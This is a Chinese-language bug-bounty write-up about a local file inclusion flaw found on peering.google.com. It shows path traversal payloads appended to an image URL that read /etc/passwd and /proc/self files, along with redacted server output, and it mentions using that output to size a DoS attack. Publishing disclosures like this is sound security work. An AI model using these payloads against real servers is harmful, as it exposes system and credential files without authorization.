![](https://image.3001.net/images/20190822/1566468037_5d5e67c57bea7.jpg!small)

**众所周知，本地文件包含漏洞（LFI）可以造成信息泄露甚至入侵系统，即使其中的包含代码不具备执行权限，但攻击者也可以从中获取一些深入渗透目标系统的有价值信息。该篇Writeup讲述的就是作者在谷歌某网络系统中发现的一个LFI漏洞，通过该漏洞可以获取到大量的系统运行和配置信息，存在严重的安全隐患，漏洞最终获得谷歌$3133的奖励。可见，大公司大厂商一样会以低级错误方式出现这种高危漏洞。**

##  漏洞影响

[peering.google.com](https://peering.google.com/)，Google Edge
network，是谷歌分布式服务器网络。其中存在LFI漏洞，可以通过它运行一些本地的系统命令，造成严重的信息泄露。

##  漏洞复现

> 访问 <https://peering.google.com/>；

然后访问该网站中的任意一张图片，如：

> Open any picture in another window for example:
> "<https://peering.google.com/static/images/couch-ipad.png>

之后，在该图片链接末尾加入一些本地执行命令，如：

    
    
    ../../../../../../../etc/passwd    
    
        
    
            ../../../../../../../proc/self/cmdline    
    
        
    
            ../../../../../../../proc/self/stat    
    
        
    
            ../../../../../../../proc/self/status    
    
        
    
            ......

最终链接形如：

> [https://peering.google.com/static/images/couch-> ipad.png../../../../../../../proc/self/cmdline](https://peering.google.com/proc/self/cmdline)

就是构造如此简单的链接打开方式，我们就能从中执行上述本地系统命令，获取到相应的系统运行和配置信息。

##  复现示例

如要获取系统服务器和内核信息，我们可以在上述图片链接末尾加上../../../../../../../proc/version，最终服务器响应回来的信息如下：

    
    
    Linux version 3.*.* #1 SMP

如要获取服务器文件系统信息，我们可以在上述图片链接末尾加上../../../../../../../proc/self/cmdline，最终服务器响应回来的信息如下：

    
    
    server_software=Google App Engine/1.*.*    

如要获取系统内网信息，我们可以在上述图片链接末尾加上../../../../../../../proc/self/net/，最终服务器响应回来的信息如下：

    
    
    apihost_address=169.*.*.253:* /server_address=169.*.*.2:*    

如可以从../../../../../../../proc/self/stat中获取一些系统的运行部署环境，如：

    
    
    (python27g_runti)    

另外，还可以从../../../../../../../proc/self/status中获得一些系统运行进程和承载能力的关键信息，为实施DoS攻击作出辅助评估：

    
    
    FDSize: 11, VmSize: 1134532 kB, VmRSS: 134860 kB, Threads: 17    

##  视频验证PoC

>
> (需要视频嵌入)：[https://www.youtube.com/watch?time_continue=47&v=khvwTKJqcsg](https://www.youtube.com/watch?time_continue=47&v=khvwTKJqcsg)

***参考来源：[updatelap](https://www.updatelap.com/2019/05/local-file-inclusion-in-peeringgooglecom.html)，clouds编译整理，转载请注明来自FreeBuf.COM**

  

